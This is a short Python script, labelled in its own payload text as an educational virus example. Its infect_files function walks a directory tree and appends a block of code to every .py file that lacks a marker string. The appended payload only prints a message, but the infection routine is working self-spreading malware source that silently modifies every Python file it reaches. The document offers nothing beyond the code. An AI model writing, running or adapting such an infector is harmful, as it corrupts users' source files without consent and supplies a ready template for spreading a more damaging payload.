import os

def infect_files(directory):
    virus_code = """
import os

def payload():
    print("Este é um exemplo educacional de vírus.")

if __name__ == "__main__":
    payload()
"""

    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".py"):
                file_path = os.path.join(root, file)
                with open(file_path, "r") as f:
                    content = f.read()
                if "Este é um exemplo educacional de vírus." not in content:
                    with open(file_path, "a") as f:
                        f.write("\n" + virus_code)

